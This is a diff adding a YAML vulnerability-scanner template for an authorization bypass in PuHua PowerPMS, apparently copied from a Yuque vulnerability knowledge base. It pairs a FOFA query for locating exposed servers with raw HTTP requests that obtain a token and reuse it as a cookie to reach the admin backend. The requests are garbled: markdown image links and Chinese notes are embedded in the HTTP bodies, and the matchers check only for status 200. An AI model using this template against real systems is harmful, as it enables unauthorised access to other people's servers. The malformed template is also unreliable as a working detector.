@@ -1,0 +1,46 @@
+id: poc-zspg3tt73g30e44e
+info:
+  name: 普华PMS BatchHandleFeedBackRecord存在权限绕过漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zspg3tt73g30e44e'
+  tags: unauth,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zspg3tt73g30e44e
+    fofa: app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
+http:
+- raw:
+  - 'GET /Plan/BatchHandleFeedBackRecord/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    accept: */*
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787583201571-771e9f56-ffcd-43a0-b888-0696b35ccfbb.png)
+
+    携带token访问管理后台任意地址'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /WebCenter/Open/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: <sitename>_TOKEN=<token>;
+
+    accept: */*
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787583201892-731349be-582f-4e37-930f-efcc3430e619.png)
+
+    写入local
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787583202253-4d1b3f6f-1da5-45c4-8133-21e828602ec8.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
